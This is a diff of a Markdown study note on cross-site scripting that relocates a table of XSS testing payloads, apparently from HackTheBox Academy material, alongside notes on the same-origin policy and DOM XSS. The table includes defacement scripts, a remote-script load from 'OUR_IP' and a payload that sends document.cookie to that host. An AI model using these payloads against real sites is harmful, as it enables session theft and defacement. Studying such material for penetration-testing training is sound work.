@@ -15,6 +15,24 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 - [Google Search XSS](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
 - [Apache XSS](https://infra.apache.org/blog/apache_org_04_09_2010)
 
+# XSS Testing Payloads
+| Description | Code |
+|-------------|------|
+| Check for filtering (See below) | ;:!--''" <SCs>=&{[(`)]}//. |
+| Basic XSS Payload | `<marquee>` |
+| Basic XSS Payload | `<script>alert(window.origin)</script>` |
+| Basic XSS Payload | `<script>alert(1)</script>` |
+| Basic XSS Payload | `<plaintext>` |
+| Basic XSS Payload | `<script>print()</script>` |
+| HTML-based XSS Payload | `<img src="" onerror=alert(window.origin)>` |
+| Change Background Color | `<script>document.body.style.background = "#141d2b"</script>` |
+| Change Background Image | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` |
+| Change Website Title | `<script>document.title = 'HackTheBox Academy'</script>` |
+| Overwrite website's main body | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` |
+| Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
+| Load remote script | `<script src="http://OUR_IP/script.js"></script>` |
+| Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
+
 # Notes
 ## Same-Origin Policy (SOP) 
 Tries to set boundaries by preventing one origin (website) from accessing resources from another origin. A different origin is defined by something that has a different protocol (`http` vs `https`), domain (`example.com` vs `google.com`) and port (`80` vs `443`)
@@ -37,24 +55,6 @@ Determine where your input is getting printed in the HTTP response we receive ba
 - Harder for security scanners to detect since the malicious code isn't present during initial page analysis :point_left:
 - Can bypass some client-side filters that only check content on page load :point_left:
 - Often involves content that gets injected into the DOM after the page has already loaded
-
-# XSS Testing Payloads
-| Description | Code |
-|-------------|------|
-| Check for filtering (See below) | ;:!--''" <SCs>=&{[(`)]}//. |
-| Basic XSS Payload | `<marquee>` |
-| Basic XSS Payload | `<script>alert(window.origin)</script>` |
-| Basic XSS Payload | `<script>alert(1)</script>` |
-| Basic XSS Payload | `<plaintext>` |
-| Basic XSS Payload | `<script>print()</script>` |
-| HTML-based XSS Payload | `<img src="" onerror=alert(window.origin)>` |
-| Change Background Color | `<script>document.body.style.background = "#141d2b"</script>` |
-| Change Background Image | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` |
-| Change Website Title | `<script>document.title = 'HackTheBox Academy'</script>` |
-| Overwrite website's main body | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` |
-| Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
-| Load remote script | `<script src="http://OUR_IP/script.js"></script>` |
-| Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
 
 # XSS Filter Bypasses
 Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.
